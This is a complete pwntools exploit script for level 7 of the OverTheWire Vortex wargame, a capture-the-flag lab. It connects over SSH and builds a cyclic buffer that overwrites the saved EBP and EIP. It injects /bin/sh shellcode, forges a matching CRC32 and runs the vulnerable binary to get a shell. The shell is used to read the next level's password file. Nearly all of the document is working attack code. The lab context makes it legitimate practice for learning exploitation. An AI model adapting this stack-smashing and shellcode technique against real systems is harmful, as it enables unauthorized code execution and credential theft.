#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn   import *
from crc32 import forge, crc32
context(arch = 'i386', os = 'linux')

level    = 7
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

if not os.path.exists(chal):
    shell.download_file(binary)
    os.chmod(chal, 0755)

# Use hellman's script to fix stack inconsitencies
# between GDB and not-GDB that make this a pain in
# the ass to debug.
shell.set_working_directory()
shell.upload_file('r.sh')

#
# We find out ESP by running in GDB below
#
esp = 0xffffdc5c
sc  = cyclic(0x100)

# If we just let it crash by not patching out any values,
# we see that the register state looks like this:
#
# EBP: 0x61736161 (b'aasa')
# EIP: 0x61746161 (b'aata')
#
# Shellcode would be aftter that ('aaua')
sc = sc.replace('aasa', p32(esp + 0)) # EBP
sc = sc.replace('aata', p32(esp + 4)) # EIP

# Add in our '/bin/sh' shellcode
sc     = sc.replace('aaua', asm(shellcraft.sh()))
forged = forge(0xe1ca95ee, sc)

#
# Find out ESP with this, by setting a breakpoint on
# 080484EC and examining ESP.
#
# gdb = shell.run("bash r.sh gdb %s $'%s'" % (binary, forged))
# gdb.send("""
# set prompt
# break *0x080484EC
# run
# """)
# gdb.clean(2)
# gdb.sendline('printf "%p\\n",$sp')
# esp = gdb.recv().strip()
# log.info("ESP: %s" % esp)
# gdb.sendline('kill')
# gdb.sendline('quit')
#

# Boom
sh = shell.run("bash r.sh %s $'%s'" % (binary, forged))

sh.sendline('id')
log.success('id: ' + sh.recvline().strip())

sh.sendline('cat %s' % passfile)
password = sh.recvline().strip()
log.success('Password: %s' % password)

print password
